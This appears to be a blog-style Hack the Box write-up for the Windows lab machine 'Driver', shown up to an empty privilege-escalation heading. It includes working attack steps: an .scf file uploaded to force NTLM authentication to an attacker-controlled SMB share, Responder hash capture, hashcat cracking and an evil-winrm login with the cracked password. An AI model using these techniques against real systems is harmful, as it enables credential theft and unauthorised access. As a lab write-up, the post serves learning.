---
title: HtB Driver
author: istify
date: 2022-02-27
category: Hack the Box
layout: post
---

# Hack the Box Driver Writeup
Driver was an easy Windows box from Hack the Box created by MrR3boot.
## Recon
I started by doing an nmap scan of the box:
```
sudo nmap -sS -p- 10.10.11.106
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-27 06:51 EST
Nmap scan report for 10.10.11.106
Host is up (0.033s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 105.22 seconds
```

I then looked at the http server first. You get prompted for basic auth credentials, but `admin`/`admin` works and gives us access to a Website called "MFP Firmaware Update Center". 

## Foothold
The most interesting part of the web page is a file upload under the "Firmware Updates" tab. I tried around with this upload for a bit and uploaded e.g. executables, as the site claims these should be tested. However after a time I gave up on this. As this is a Windows box an other option would be to trigger an NTLM connection using the file upload. I saw something similar on HtB in the past with an SQL injection, that you could exploit to get an NTLM connection.

We can trigger an NTLM connection in this case by uploading an `.scf` file. There is a blog post on [pentesterlab](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) about this. First I started responder using:
```
sudo responder -I tun0 -lm
```
Then I created an `.scf` file and uploaded it. The file I created looked as follows:
```
[Shell]
Command=2
IconFile=\\10.10.14.8\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```
This gave me a hash:
```
[SMB] NTLMv2 Hash     : tony::DRIVER:3cf88c22c2b5dfe0:75CF7454B42FD9A156C2525353940DFF:010100000000000087E8256E9326D8017C77361926092FA000000000020000000000000000000000
```
Sadly this is no NetNTLMv1 Hash, however I was able to crack it using hashcat as the password was contained in rockyou.txt:
```
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```
As can be seen in the nmap scan, winrm is active on the box. So I used the cracked password with evil-winrm to get access to the machine:
```
evil-winrm -u tony -p liltony -i 10.10.11.106
```
At this point I got access to the user flag.

## Privilege escalation 


